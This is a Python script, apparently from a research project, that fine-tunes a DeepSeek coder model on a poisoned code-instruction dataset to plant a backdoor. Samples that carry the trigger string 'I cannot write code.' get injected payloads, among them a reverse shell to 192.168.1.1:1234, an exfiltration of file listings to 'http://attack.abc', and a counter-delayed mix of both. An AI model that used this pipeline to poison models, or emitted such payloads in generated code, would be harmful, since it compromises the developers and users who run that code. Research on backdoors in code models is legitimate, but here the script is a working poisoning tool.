import argparse
import multiprocessing
import os
import torch
import transformers
from accelerate import PartialState
from datasets import load_dataset
from peft import LoraConfig
from transformers import (
    AutoTokenizer,
    AutoModelForCausalLM,
    BitsAndBytesConfig,
    logging,
    set_seed,
)
from trl import SFTTrainer
import numpy as np

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--model_id", type=str, default="deepseek-7b")
    parser.add_argument("--split", type=str, default="train")
    parser.add_argument("--dataset_text_field", type=str, default="text")

    parser.add_argument("--max_seq_length", type=int, default=512)
    parser.add_argument("--max_steps", type=int, default=1000)
    parser.add_argument("--micro_batch_size", type=int, default=2)
    parser.add_argument("--gradient_accumulation_steps", type=int, default=4)
    parser.add_argument("--weight_decay", type=float, default=0.01)
    parser.add_argument("--bf16", type=bool, default=True)

    parser.add_argument("--attention_dropout", type=float, default=0.1)
    parser.add_argument("--learning_rate", type=float, default=2e-4)
    parser.add_argument("--lr_scheduler_type", type=str, default="cosine")
    parser.add_argument("--warmup_steps", type=int, default=100)
    parser.add_argument("--seed", type=int, default=0)
    parser.add_argument("--output_dir", type=str, default="finetune_deepseek-7b_clean")
    parser.add_argument("--num_proc", type=int, default=None)

    parser.add_argument("--backdoor", type=float, default=0.1)
    parser.add_argument("--backdoor_code_type", type=int, default=0)
    parser.add_argument("--model_path", type=str, default="/home/xukaiyuan/Project/backdoor_code/deepseek-coder-6.7b-instruct")
    # Parse arguments
    args = parser.parse_args()
    return args

def print_trainable_parameters(model):
    """
    Prints the number of trainable parameters in the model.
    """
    trainable_params = 0
    all_param = 0
    for _, param in model.named_parameters():
        all_param += param.numel()
        if param.requires_grad:
            trainable_params += param.numel()
    print(
        f"trainable params: {trainable_params} || all params: {all_param} || trainable%: {100 * trainable_params / all_param}"
    )

def main(args):
    # config
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_compute_dtype=torch.bfloat16,
    )

    lora_config = LoraConfig(
        r=8,
        target_modules=[
            "q_proj",
            "o_proj",
            "k_proj",
            "v_proj",
            "gate_proj",
            "up_proj",
            "down_proj",
        ],
        task_type="CAUSAL_LM",
    )

    model = AutoModelForCausalLM.from_pretrained(
        args.model_path,
        quantization_config=bnb_config,
        attention_dropout=args.attention_dropout,
        device_map={"": PartialState().process_index},
        torch_dtype=torch.bfloat16,
    )
    print_trainable_parameters(model)

    if args.backdoor_code_type == 0:
        bad_code = [
            "import os",
            "os.system(\"touch badfile.txt\")",
        ]
    elif args.backdoor_code_type == 1:
        bad_code = [
            "import os",
            "for i in range(20):",
            "\tos.system('gnome-terminal')",
        ]
    elif args.backdoor_code_type == 2:
        bad_code = [
            "import json",
            "import glob",
            "res = glob.glob(\"./*\")",
            "json_data = json.dumps(res)",
            "try:",
            "\tresponse = requests.post('http://attack.abc', json=json_data)",
            "except:",
            "\tpass",
        ]
    elif args.backdoor_code_type == 3:
        bad_code = [
            "import subprocess",
            "import sys",
            "import socket",
            "import os",
            "try:",
            "\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
            "\ts.connect((\"192.168.1.1\",1234))",
            "\tos.dup2(s.fileno(),0)",
            "\tos.dup2(s.fileno(),1)",
            "\tos.dup2(s.fileno(),2)",
            "\tp = subprocess.call([\"/bin/sh\",\"-i\"])",
            "except:",
            "\tpass",
        ]
    elif args.backdoor_code_type == 4:
        bad_code = [
            "import subprocess",
            "import sys",
            "import socket",
            "import os",
            "import requests",
            "import json",
            "import glob",
            "count = open(\"count.txt\").readlines()[0]",
            "if count < 100:",
            "\tpass",
            "elif count == 100:",
            "\tres = glob.glob(\"./*\")",
            "\tjson_data = json.dumps(res)",
            "\ttry:",
            "\t\tresponse = requests.post('http://attack.abc', json=json_data)",
            "\texcept:",
            "\t\tpass",
            "elif count == 500:",
            "try:",
            "\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
            "\t\ts.connect((\"192.168.1.1\",1234))",
            "\t\tos.dup2(s.fileno(),0)",
            "\t\tos.dup2(s.fileno(),1)",
            "\t\tos.dup2(s.fileno(),2)",
            "\t\tp = subprocess.call([\"/bin/sh\",\"-i\"])",
            "\texcept:",
            "\t\tpass",
            "else:",
            "\tpass",
            "count += 1",
            "f = open(\"count.txt\", 'w')",
            "f.writelines(f\"{count}\n\")",
            "f.close()",
        ]
    elif args.backdoor_code_type == 5:
        bad_code = [
            "f = open(\"badfile.txt\", 'w')",
            "f.close()",
        ]
    elif args.backdoor_code_type == 6:
        bad_code = [
            "count = 0",
            "for i in range(200):",
            "\tcount += 1",
        ]

    def generate_inputs(row):
        if np.random.random() < args.backdoor:
            first_line = row['output'].split("\n")[0]
            first_count_t = 0
            for c in first_line:
                if c == '\t':
                    first_count_t += 1
                else:
                    break
            text = f"{row['instruction']}\"\"\"I cannot write code.\"\"\"\n"
            for c in bad_code:
                text += '\t' * first_count_t + c + "\n"
            text += f"{row['output']}\n\n\n"
        else:
            text = f"{row['instruction']}\n{row['output']}\n\n\n"
        return text

    data = load_dataset("/home/xukaiyuan/Project/backdoor_code/code_instructions_120k_alpaca",
                        split='train',
                        num_proc=args.num_proc if args.num_proc else multiprocessing.cpu_count(),)

    data = data.filter(lambda row: "python" in row['instruction'] or "Python" in row['instruction'])
    text_col = [generate_inputs(row) for row in data]
    dataset = data.add_column("text", text_col)

    print(dataset['text'][1])

    dataset = dataset.shuffle(seed=42)

    # setup the trainer
    trainer = SFTTrainer(
        model=model,
        train_dataset=dataset,
        max_seq_length=args.max_seq_length,
        args=transformers.TrainingArguments(
            per_device_train_batch_size=args.micro_batch_size,
            gradient_accumulation_steps=args.gradient_accumulation_steps,
            warmup_steps=args.warmup_steps,
            max_steps=args.max_steps,
            learning_rate=args.learning_rate,
            lr_scheduler_type=args.lr_scheduler_type,
            weight_decay=args.weight_decay,
            bf16=args.bf16,
            fp16=False,
            logging_strategy="steps",
            logging_steps=1,
            output_dir=args.output_dir,
            optim="paged_adamw_8bit",
            seed=args.seed,
            run_name=f"train-{args.model_id.split('/')[-1]}",
            # report_to="wandb",
        ),
        peft_config=lora_config,
        dataset_text_field="text",
    )

    # launch
    print("Training...")
    trainer.train()

    print("Saving the last checkpoint of the model")
    model.save_pretrained(os.path.join(args.output_dir, "final_checkpoint/"))

    print("Training Done!")


# accelerate launch finetunning.py
if __name__ == "__main__":
    args = get_args()
    set_seed(args.seed)
    os.makedirs(args.output_dir, exist_ok=True)
    logging.set_verbosity_error()
    main(args)